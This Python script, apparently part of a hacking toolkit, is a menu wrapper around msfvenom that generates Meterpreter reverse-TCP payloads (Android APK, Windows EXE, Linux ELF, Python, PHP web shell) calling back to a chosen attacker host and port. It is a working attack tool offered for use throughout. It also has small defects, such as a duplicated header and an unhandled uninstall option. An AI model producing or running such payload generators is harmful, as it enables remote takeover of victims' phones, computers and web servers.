# CREATED BY: RAMIZ UDDIN
import os, time

def tool_header(name):
    os.system("clear")
    print("\033[1;36m" + "="*45)
    print(f"      {name.upper()}")
    print("      CREATED BY: RAMIZ UDDIN")
    print("="*45 + "\033[0m")

# CREATED BY: RAMIZ UDDIN
import os
import socket
import subprocess
import time
import cyber_deps

# Ensure metasploit is installed (though it's a huge package, we check for msfvenom)
def check_msf():
    if subprocess.getstatusoutput("command -v msfvenom")[0] != 0:
        print("\033[1;32m[*] ", end=""); print("\n\033[1;31m[!] Error: msfvenom (Metasploit) is NOT installed.\033[0m")
        print("\033[1;32m[*] ", end=""); print("[*] Please run Tool 12 (Metasploit Suite) first to install it.")
        return False
    return True

def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def run():
    while True:
        os.system("clear")
        print("\033[1;32m[*] ", end=""); print("\n\033[1;31m========================================\033[0m")
        print("\033[1;32m[*] ", end=""); print("      ADVANCED PAYLOAD GENERATOR v2.0")
        print("\033[1;32m[*] ", end=""); print("\033[1;31m========================================\033[0m")
        
        if not check_msf():
            input("\n[Press Enter to Return]")
            break

        print("\033[1;32m[*] ", end=""); print("1. Android (APK Meterpreter)")
        print("\033[1;32m[*] ", end=""); print("2. Windows (EXE 64-bit Meterpreter)")
        print("\033[1;32m[*] ", end=""); print("3. Linux (ELF 64-bit Meterpreter)")
        print("\033[1;32m[*] ", end=""); print("4. Python (Simple Reverse Shell)")
        print("\033[1;32m[*] ", end=""); print("5. PHP (Web Shell Payload)")
        print("\033[1;32m[*] ", end=""); print("99. Uninstall This Tool (Remove Packages)")
        print("\033[1;32m[*] ", end=""); print("0. Back")
        
        choice = input("\nPayload > ")
        if choice == '0': break
        
        auto_ip = get_ip()
        lhost = input(f"Enter LHOST (Default: {auto_ip}): ") or auto_ip
        lport = input("Enter LPORT (Default: 4444): ") or "4444"
        output = input("Enter Output Filename: ")
        
        if not output:
            print("\033[1;32m[*] ", end=""); print("[-] Error: Output filename required.")
            time.sleep(1); continue

        cmd = ""
        if choice == '1':
            print("\033[1;32m[*] ", end=""); print("[*] Generating Android APK...")
            cmd = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R > {output}"
        elif choice == '2':
            print("\033[1;32m[*] ", end=""); print("[*] Generating Windows EXE...")
            cmd = f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe > {output}"
        elif choice == '3':
            print("\033[1;32m[*] ", end=""); print("[*] Generating Linux ELF...")
            cmd = f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf > {output}"
        elif choice == '4':
            print("\033[1;32m[*] ", end=""); print("[*] Generating Python Payload...")
            cmd = f"msfvenom -p python/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw > {output}.py"
        elif choice == '5':
            print("\033[1;32m[*] ", end=""); print("[*] Generating PHP Web Shell...")
            cmd = f"msfvenom -p php/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw > {output}.php"
        
        if cmd:
            print("\033[1;32m[*] ", end=""); print(f"\n\033[1;33m[*] Executing: {cmd}\033[0m")
            os.system(cmd)
            if os.path.exists(output) or os.path.exists(f"{output}.py") or os.path.exists(f"{output}.php"):
                print("\033[1;32m[*] ", end=""); print(f"\n\033[1;32m[+] Payload successfully saved to {output}\033[0m")
            else:
                print("\033[1;32m[*] ", end=""); print("\n\033[1;31m[-] Generation failed. Check your Metasploit installation.\033[0m")
        
        input("\n[Press Enter to Continue]")

if __name__ == "__main__": run()
